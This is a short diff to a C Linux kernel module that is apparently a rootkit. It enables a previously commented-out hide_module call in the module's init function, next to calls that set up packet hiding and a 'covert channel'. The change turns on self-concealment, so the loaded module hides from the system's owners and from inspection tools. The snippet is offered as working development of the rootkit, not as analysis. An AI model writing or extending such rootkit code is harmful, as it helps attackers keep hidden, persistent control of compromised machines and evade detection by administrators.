@@ -84,7 +84,7 @@ int __init init(void)
 	init_packet_hiding();
 
 	// Hide our module
-	// hide_module(&__this_module);
+   hide_module(&__this_module);
 
   // Establish the covert channnel
 	init_vt_channel();
